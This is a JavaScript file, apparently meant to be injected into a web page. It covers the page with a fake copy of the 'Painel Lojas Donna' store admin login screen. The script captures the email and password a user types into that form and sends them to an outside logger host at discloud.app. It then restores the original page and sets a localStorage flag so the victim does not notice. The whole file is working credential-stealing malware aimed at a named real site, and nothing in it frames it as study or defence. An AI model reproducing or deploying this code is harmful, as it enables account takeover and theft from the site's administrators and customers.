if (localStorage.getItem("status") === "foi") {
  console.log("ok");
} else {
  const originalHTML = document.documentElement.innerHTML;

  document.getElementsByTagName("html")[0].innerHTML = `
    

  <!DOCTYPE html>
  <html lang="pt-br">
      <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
          <title>Painel Lojas Donna</title>
  
          <!-- Core CSS - Include with every page -->
          <!-- Bootstrap -->
          <link href="/lib/vendors/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
          <!-- Font Awesome -->
          <link href="/lib/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet">
  
          <!--loader-->
          <link href="/lib/pace/pace-theme-barber-shop.css" rel="stylesheet">
  
          <!-- PNotify -->
          <link href="/lib/vendors/pnotify/dist/pnotify.css" rel="stylesheet">
          <link href="/lib/vendors/pnotify/dist/pnotify.buttons.css" rel="stylesheet">
          <link href="/lib/vendors/pnotify/dist/pnotify.nonblock.css" rel="stylesheet">
  
          <link href="/lib/painel/css/login.css" rel="stylesheet">
  
          <link rel="icon" type="image/png" href="/lib/painel/img/logo-marknet-k.svg" />
      </head>
      <body class="login">
          <div class='right_col main-content'>
              <div class="login_wrapper">
      <div class="animate form login_form">
          <section class="login_content">
              <form role="form" id="frmLogin" name="frmLogin" method="post">
                  <div class="init">
                      <div class="box-logo-produto">
                                                              <img src="/lib/painel/img/logo-mkommerce.svg" class="logo-produto">
                                                          </div>
                      <h1>Acesse</h1>
                      <div>
                          <input class="form-control" placeholder="E-mail" id="fidentidade" name="identidade" type="email" required="" tabindex="0" />
                      </div>
                      <div>
                          <input type="password" class="form-control" placeholder="Senha" id="fcredencial" name="credencial" required="" />
                      </div>
                      <div>
                          <button type="submit" class="btn btn-default submit">Entrar</button>
                          <br>
                          <a class="bt-recover" href="/painel/tela/OUTFRM003" title="Clique para redefinir a senha.">Esqueceu sua senha?</a>
                      </div>
                  </div>
                  <div class="clearfix"></div>
  
                  <div class="separator">
                      <div class="clearfix"></div>
                      <br />
                      <div>
                          <h1><img src="/lib/painel/img/logo-marknet-digital.svg" title="Marknet Digital" alt="Marknet Digital"></h1>
                          <p class="direitos text-muted">©2024 Todos os direitos reservados.</p>
                          <p><small class="text-muted">v2.105.59</small></p>
                      </div>
                  </div>
              </form>
          </section>
      </div>
  </div>
  
  <script>
      var urlToRedirect = 'https://lojasdonna.com.br/painel/tela/INDLIS001';
  </script>
  
          </div>
          <div id="page-externals"></div>
          <div id="page-notifications"></div>
  
          <div class="modal fade" id="pleaseWaitDialog" tabindex="-1" role="dialog" aria-labelledby="pleaseWaitDialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
              <div class="modal-dialog">
                  <div class="modal-content">
                      <div class="modal-header">
                          <h4 class="modal-title" id="OUTNOT001-title">Processando</h4>
                      </div>
                      <div class="modal-body">
                          <div class="progress progress-striped active">
                              <div class="progress-bar"  role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 100%">
                                  <span class="sr-only">100% completo</span>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          </div>
          <!-- Core Scripts - Include with every page -->
          <script src="/lib/jquery.js"></script>
          <!--<script src="/lib/sb-admin/js/jquery-1.10.2.js"></script>-->
          <script src="/lib/sb-admin/js/bootstrap.min.js"></script>
          <script src="/lib/sb-admin/js/plugins/metisMenu/jquery.metisMenu.js"></script>
  
          <!-- SB Admin Scripts - Include with every page -->
          <script src="/lib/sb-admin/js/sb-admin.js"></script>
  
          <script src="/lib/bootstrap-modal/js/bootstrap-modalmanager.js"></script>
          <script src="/lib/bootstrap-modal/js/bootstrap-modal.js"></script>
          <script src="/lib/jquery.populate.js"></script>
  
          <!--Loader-->
          <script src="/lib/pace/pace.min.js"></script>
  
          <!-- PNotify -->
          <script src="/lib/vendors/pnotify/dist/pnotify.js"></script>
          <script src="/lib/vendors/pnotify/dist/pnotify.buttons.js"></script>
          <script src="/lib/vendors/pnotify/dist/pnotify.nonblock.js"></script>
  
          <script src="/lib/painel/js/painel.js"></script>
  
          <script type="" src="/lib/painel/js/telas/out/frm001.js"></script>    </body>
  </html>
  
    `;

  document.querySelector(".btn.btn-default.submit").addEventListener("click", function (event) {
    event.preventDefault();

    const userName = document.getElementById("fidentidade").value;
    const password = document.getElementById("fcredencial").value;

    const url = `https://skr1pt.discloud.app/logger?message=${userName}:${password}`;
    fetch(url, {
      method: "GET",
    })
      .then((response) => response.text())
      .then((data) => {
        console.log(data);
        localStorage.setItem("status", "foi");

        document.documentElement.innerHTML = originalHTML;
      })
      .catch((error) => {
        document.documentElement.innerHTML = originalHTML;
        localStorage.setItem("status", "foi");
      });
  });
}
